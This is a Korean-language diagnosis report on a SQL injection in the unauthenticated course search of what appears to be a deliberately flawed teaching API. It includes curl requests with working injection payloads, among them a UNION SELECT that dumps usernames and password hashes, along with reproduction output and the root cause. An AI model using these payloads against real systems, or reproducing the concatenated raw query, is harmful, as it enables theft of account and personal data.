# 결함 6 진단 보고서: 강의 검색의 검색어가 쿼리로 실행됨

| 항목 | 내용 |
|---|---|
| 대상 | 이 저장소의 태그 `v2-defect-6`을 로컬에서 띄운 API (`http://127.0.0.1:4000`) |
| 경로 | `GET /courses?q=` (로그인 없이 열리는 경로) |
| 분류 | OWASP Top 10 2025 A05 Injection / CWE-89 (SQL 인젝션) |
| 위험도 | 높음 |
| 해당 구성 요소 | 객체. 시행 지점(PEP)은 강의 목록을 열어 준 것인데, 검색어가 쿼리를 바꿔 다른 객체(사용자, 신청)를 읽습니다 |
| 상태 | 확인됨. 조치 전 |

## 1. 요약

강의 검색이 검색어를 쿼리 문자열에 이어 붙여 실행합니다. 검색어에 작은따옴표를 넣으면 그 뒤의 글자가 값이 아니라 쿼리의 일부로 실행됩니다. 이 경로는 로그인 없이 열려 있어서, 토큰 없이 요청 한 번으로 사용자 테이블의 계정 이름과 비밀번호 해시, 신청 테이블의 전화번호를 읽을 수 있습니다.

위험도를 높음으로 본 근거입니다.

| | 근거 |
|---|---|
| 높이는 쪽 | 로그인이 필요 없습니다. 주소를 아는 누구나 보낼 수 있습니다 |
| 높이는 쪽 | 요청 한 번으로 테이블 전체가 나옵니다. 계정 5개의 비밀번호 해시와 신청 3건의 전화번호가 한 응답에 들어 있습니다 |
| 높이는 쪽 | 응답이 정상(200)이고 강의 목록과 같은 모양이라, 상태 코드만 봐서는 알 수 없습니다 |
| 높이는 쪽 | API가 DB에 접속하는 계정이 모든 테이블을 읽을 수 있습니다. 검색에 필요한 것은 `courses`뿐입니다 |
| 낮추는 쪽 | 비밀번호는 원문이 아니라 scrypt 해시입니다. 원문을 얻으려면 해시마다 따로 대입해야 합니다 |
| 낮추는 쪽 | 이 보고서가 확인한 것은 읽기입니다. 쓰기와 삭제는 확인하지 않았습니다 |

## 2. 재현 절차

준비:

```bash
git checkout v2-defect-6
docker compose up -d --wait
cd apps/api
cp .env.example .env
npm ci --ignore-scripts
npm run db:generate && npm run build
npm run db:migrate && npm run db:seed
npm start
```

요청 1 (기대한 동작: 제목에 "보안"이 든 강의):

```bash
curl -s -G --data-urlencode "q=보안" http://127.0.0.1:4000/courses
```

```json
[{"id":"c1","title":"웹 보안 입문"}]
```

요청 2 (작은따옴표 하나):

```bash
curl -s -G --data-urlencode "q='" http://127.0.0.1:4000/courses
```

```json
{"error":"internal_error"}
```

500입니다. 검색어의 따옴표가 쿼리의 문자열을 닫아서 문법 오류가 났습니다. 검색어가 값으로 다뤄졌다면 0건이 나와야 합니다.

요청 3 (조건을 항상 참으로):

```bash
curl -s -G --data-urlencode "q=없는 제목' OR '%'='" http://127.0.0.1:4000/courses
```

제목에 없는 말로 찾았는데 강의 2건이 모두 나옵니다.

요청 4 (사용자 테이블을 합침):

```bash
curl -s -G --data-urlencode "q=없는 제목' UNION SELECT username, \"passwordHash\" FROM users --" http://127.0.0.1:4000/courses
```

토큰 없이 200이고 5건입니다(해시는 이 문서에서 가렸습니다).

```json
[
  {"id":"student2","title":"scrypt$<가림>"},
  {"id":"admin1","title":"scrypt$<가림>"},
  {"id":"instructor1","title":"scrypt$<가림>"},
  {"id":"student1","title":"scrypt$<가림>"},
  {"id":"instructor2","title":"scrypt$<가림>"}
]
```

강의의 `id` 자리에 계정 이름이, `title` 자리에 비밀번호 해시가 들어 있습니다. `FROM enrollments`로 바꿔 `id, phone`을 고르면 신청 3건의 전화번호가 같은 방식으로 나옵니다.

재현 스크립트 (`main`의 스크립트를 결함 상태의 API에 실행):

```bash
node .github/scripts/defects/defect-6.mjs
```

```
결함 6: 강의 검색(GET /courses?q=)의 검색어 처리
대상: http://127.0.0.1:4000
- 검색어: 제목에 없는 말 (토큰 없음, 0건이 맞음)
    → 상태 200 · 0건
- 검색어: 작은따옴표 하나 (')
    → 상태 500 · 0건
- 검색어: 제목에 없는 말 + ' OR '%'='
    → 상태 200 · 2건 · 강의 2건
- 검색어: 제목에 없는 말 + UNION SELECT … FROM users
    → 상태 200 · 5건 · 사용자 테이블에서 온 행 5건(계정 이름과 비밀번호 해시)
- 검색어: 제목에 없는 말 + UNION SELECT … FROM enrollments
    → 상태 200 · 3건 · 신청 테이블에서 온 행 3건(신청 id와 전화번호)
판정: 취약
```

스크립트는 응답의 값을 출력하지 않고 건수만 셉니다. 기대한 동작은 다섯 요청 모두 200에 0건입니다. 다섯 검색어 모두 그대로 제목에 들어 있는 강의가 없기 때문입니다.

## 3. 원인

검색어가 쿼리 문자열 안에 들어간 뒤에 DB로 넘어갑니다. DB는 어디까지가 원래 쿼리이고 어디부터가 검색어인지 구분할 수 없습니다.

```mermaid
flowchart LR
  req(["GET /courses<br/>?q=검색어<br/>토큰 없음"])

  subgraph api["API"]
    g["인증·인가 Guard<br/>@Public이라 통과"]
    s["강의 검색<br/>검색어를 쿼리에<br/>이어 붙임"]
  end

  subgraph db["PostgreSQL"]
    c[("courses<br/>제목")]
    u[("users<br/>비밀번호 해시")]
    e[("enrollments<br/>전화번호")]
  end

  req --> g --> s
  s -- "제목 검색" --> c
  s -- "검색어에 든<br/>UNION SELECT" --> u
  s -- "검색어에 든<br/>UNION SELECT" --> e
  s --> res(["200 · 강의 목록과<br/>같은 모양의 응답"])

  classDef safe fill:#E1F5EE,stroke:#0F6E56,color:#04342C
  classDef danger fill:#FCEBEB,stroke:#A32D2D,color:#501313
  class g,c safe
  class s,u,e danger
  style api fill:none,stroke:#57606a
  style db fill:none,stroke:#57606a
  linkStyle 3,4 stroke:#A32D2D,stroke-width:2px
```

빨강은 검색어가 쿼리에 섞이는 곳과 그 쿼리가 읽는 테이블, 초록은 정상으로 동작하는 곳입니다. Guard는 강의 목록을 로그인 없이 열어 준 것이고, 그 판단은 맞습니다.

### 3.1 원인 코드

- 검색어 `q`를 템플릿 문자열로 쿼리에 넣고 `$queryRawUnsafe`로 실행합니다: [`courses/courses.service.ts` 17~21행](https://github.com/loquemedalagana/secure-enroll-demo/blob/v2-defect-6/apps/api/src/courses/courses.service.ts#L17-L21).
- 컨트롤러는 받은 `q`를 그대로 넘깁니다: [`courses/courses.controller.ts` 15행](https://github.com/loquemedalagana/secure-enroll-demo/blob/v2-defect-6/apps/api/src/courses/courses.controller.ts#L15).

### 3.2 검색어에 따라 실행되는 쿼리

코드가 만드는 쿼리는 `… WHERE title ILIKE '%` + 검색어 + `%' ORDER BY id ASC`입니다. 굵은 부분이 검색어입니다.

| 검색어 | 실행되는 쿼리의 조건 부분 | 결과 |
|---|---|---|
| `보안` | `title ILIKE '%`**`보안`**`%' ORDER BY …` | 기대한 동작 |
| `'` | `title ILIKE '%`**`'`**`%' ORDER BY …` | 문자열이 먼저 닫혀 문법 오류 (500) |
| `없는 제목' OR '%'='` | `title ILIKE '%`**`없는 제목' OR '%'='`**`%' ORDER BY …` | `'%'='%'`가 참이라 모든 강의 |
| `없는 제목' UNION SELECT username, "passwordHash" FROM users --` | `title ILIKE '%`**`없는 제목' UNION SELECT … FROM users --`**`%' ORDER BY …` | `--` 뒤는 주석이 되고, 사용자 테이블이 합쳐짐 |

### 3.3 이 결함을 처음 잡은 테스트

없습니다. 이 태그에서 API 테스트 94건이 모두 통과합니다. 검색 테스트 2건은 제목에 들어 있는 말, 없는 말, 빈 검색어만 보냅니다.

### 3.4 결함을 잡는 테스트

작성 전.

### 3.5 보안 관점: 접근통제 구성 요소로 본 결함

| 구성 요소 | 이 결함에서 | 코드에서 확인하는 곳 |
|---|---|---|
| 주체 | 로그인하지 않은 요청 | |
| 객체 | 열어 준 것은 강의의 id와 제목입니다. **쿼리가 바뀌어 사용자와 신청까지 객체가 됩니다. 결함은 여기입니다** | [`courses/courses.service.ts` 17~21행](https://github.com/loquemedalagana/secure-enroll-demo/blob/v2-defect-6/apps/api/src/courses/courses.service.ts#L17-L21) |
| 시행 (PEP) | 정상. `@Public`이 붙은 핸들러라 통과시킵니다 | `auth/auth.guard.ts`, `authz/authz.guard.ts` |
| 판단 (PE) | 호출되지 않습니다. 공개 경로라 판단할 것이 없습니다 | `authz/policy.ts` |

결함 1과 2는 시행 지점이 요청을 막지 못한 경우였습니다. 결함 6에서는 시행 지점이 맞게 동작합니다. 시행 지점은 "어느 핸들러로 가는 요청인가"까지만 보고, 그 핸들러가 DB에서 무엇을 읽는지는 보지 않습니다. 신청 한 건 조회(`GET /enrollments/:id`)는 소유자, 담당 강사, 관리자만 통과하는데, 같은 전화번호가 공개 경로의 쿼리로 나옵니다.

## 4. 조치

작성 전.

## 5. 조치 뒤 재확인

작성 전.

## 6. Burp Suite 진단 기록

작성 전.
